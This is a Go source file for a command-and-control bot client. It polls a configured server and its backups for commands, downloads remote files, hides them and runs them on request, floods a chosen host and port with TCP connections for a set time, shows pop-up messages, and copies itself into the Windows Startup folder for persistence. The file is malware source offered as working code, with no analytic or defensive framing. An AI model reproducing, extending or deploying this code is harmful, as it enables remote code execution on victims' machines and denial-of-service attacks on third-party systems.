package main

import (
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

func isAdmin() (bool, error) {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		if strings.Contains(err.Error(), "Access is denied") {
			return false, nil
		}
		return false, err
	}
	return true, nil
}

func copyFile(src, dst string) error {
	input, err := os.ReadFile(src)
	if err != nil {
		return err
	}

	err = os.WriteFile(dst, input, 0644)
	return err
}

func copyToStartup(executablePath string) {
	var startupPath string
	admin, err := isAdmin()
	if err != nil {
		fmt.Println("Error checking admin privileges:", err)
		return
	}

	if admin {
		startupPath = filepath.Join(os.Getenv("ProgramData"), "Microsoft\\Windows\\Start Menu\\Programs\\StartUp")
	} else {
		startupPath = filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
	}

	destPath := filepath.Join(startupPath, filepath.Base(executablePath))

	err = copyFile(executablePath, destPath)
	if err != nil {
		fmt.Println("Error copying file:", err)
	} else {
		fmt.Println("Successfully copied to startup folder:", destPath)
	}
}

func executeOtherScript() {
	cmd := exec.Command("/bin/sh", "otherScript.sh")
	if err := cmd.Run(); err != nil {
		fmt.Println("Error executing other script:", err)
	} else {
		fmt.Println("Successfully executed other script.")
	}
}

func runAtStartup() {
	if runtime.GOOS == "windows" {
		executable, err := os.Executable()
		if err != nil {
			fmt.Println("Error getting executable path:", err)
			return
		}
		copyToStartup(executable)
	} else {
		executeOtherScript()
	}
}

type Config struct {
	URL        string   `json:"url"`
	BackupURLs []string `json:"backups"`
}

func downloadFile(url, filename string, run, hide bool) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("HTTP request failed with status code %d", resp.StatusCode)
	}

	out, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return err
	}

	if hide {
		if runtime.GOOS == "windows" {
			err := exec.Command("attrib", "+H", filename).Run()
			if err != nil {
				return fmt.Errorf("failed to hide the file: %v", err)
			}
		} else {
			hiddenFilename := "." + filename
			err := os.Rename(filename, hiddenFilename)
			if err != nil {
				return fmt.Errorf("failed to rename the file: %v", err)
			}
			filename = hiddenFilename
		}
	}
	if run {
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/C", "start", filename)
		} else {
			os.Chmod(filename, 0755)
			cmd = exec.Command("./" + filename)
		}
		cmd.Run()
	}

	return nil
}

func displayMessageInHTML(message string) {

	tmpfile, err := ioutil.TempFile("", "message-*.html")
	if err != nil {
		fmt.Printf("Error creating a temporary file: %s\n", err)
		return
	}
	defer tmpfile.Close()

	htmlContent := fmt.Sprintf("<html><body><p>%s</p></body></html>", message)
	if _, err := tmpfile.Write([]byte(htmlContent)); err != nil {
		fmt.Printf("Error writing to temporary file: %s\n", err)
		return
	}

	openBrowser(tmpfile.Name())
}

func openBrowser(url string) {
	var err error

	switch runtime.GOOS {
	case "linux":
		err = exec.Command("xdg-open", url).Start()
	case "windows":
		err = exec.Command("rundll32", "url.dll,FileProtocolHandler", url).Start()
	case "darwin":
		err = exec.Command("open", url).Start()
	default:
		err = fmt.Errorf("unsupported platform")
	}

	if err != nil {
		fmt.Printf("Error opening browser: %s\n", err)
	}
}

func LoadConfig(path string) (*Config, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var config Config
	decoder := json.NewDecoder(file)
	err = decoder.Decode(&config)
	if err != nil {
		return nil, err
	}

	return &config, nil
}

func FetchCommand(config *Config) (string, error) {
	urls := append([]string{config.URL}, config.BackupURLs...)
	for _, url := range urls {
		resp, err := http.Get(url + "?nocache=" + generateRandomString(20))
		if err == nil && resp.StatusCode == http.StatusOK {
			body, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			return string(body), nil
		}
	}
	return "", fmt.Errorf("all URLs failed")
}

func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}
func DOS(target string, port string, duration time.Duration) {
	endTime := time.Now().Add(duration)
	var wg sync.WaitGroup

	send := func() {
		defer wg.Done()
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", target, port))
		if err != nil {
			fmt.Println(err)
			return
		}
		defer conn.Close()

		_, err = conn.Write([]byte("GET / HTTP/1.1\r\n\r\n"))
		if err != nil {
			fmt.Println(err)
			return
		}
	}

	for time.Now().Before(endTime) {
		wg.Add(1)
		go send()
		time.Sleep(10 * time.Millisecond)
	}

	wg.Wait()
}

func ParseCommand(command string) error {
	commands := strings.Split(command, "\n")
	for _, cmd := range commands {
		parts := strings.Fields(cmd)
		if len(parts) == 0 {
			continue
		}

		switch parts[0] {
		case "popmsg":
			if len(parts) > 1 {
				message := strings.Join(parts[1:], " ")
				displayMessageInHTML(message)
			}
		case "download":
			if len(parts) >= 3 {
				url := parts[1]
				filename := parts[2]

				run := false
				hide := false

				for _, part := range parts[3:] {
					if part == "RUN" {
						run = true
					} else if part == "HIDE" {
						hide = true
					}
				}

				err := downloadFile(url, filename, run, hide)
				if err != nil {
					fmt.Printf("Error downloading file: %s\n", err)
				}
			} else {
				fmt.Println("Invalid download command. Usage: download [url] [filename] [RUN] [HIDE]")
			}

		default:
			if strings.HasPrefix(cmd, "dos ") {
				info := strings.TrimSpace(strings.TrimPrefix(cmd, "dos "))
				parts := strings.Fields(info)
				if len(parts) < 3 {
					return fmt.Errorf("Usage: dos <IP/domain> <port> <duration>")
				}

				target := parts[0]
				port := parts[1]
				durationStr := parts[2]

				duration, err := time.ParseDuration(durationStr + "s")
				if err != nil {
					return fmt.Errorf("Invalid duration: %s", durationStr)
				}

				DOS(target, port, duration)
			}
		}

	}
	return nil
}

func executeSystemCommand(name string, args []string) {
	cmd := exec.Command(name, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Run()
	if err != nil {
		fmt.Printf("Error executing command '%s': %s\n", name, err)
	}
}

func main() {
	fmt.Println("Starting program...")
	rand.Seed(time.Now().UnixNano())

	config, err := LoadConfig("config.json")
	if err != nil {
		fmt.Printf("Error loading config: %s\n", err)
		os.Exit(1)
	}

	for {

		command, err := FetchCommand(config)
		if err != nil {
			fmt.Printf("Error fetching command: %s\n", err)
			time.Sleep(60 * time.Second)
			continue
		}

		fmt.Printf("Received command: %s\n", command)
		ParseCommand(command)

		time.Sleep(60 * time.Second)
	}
}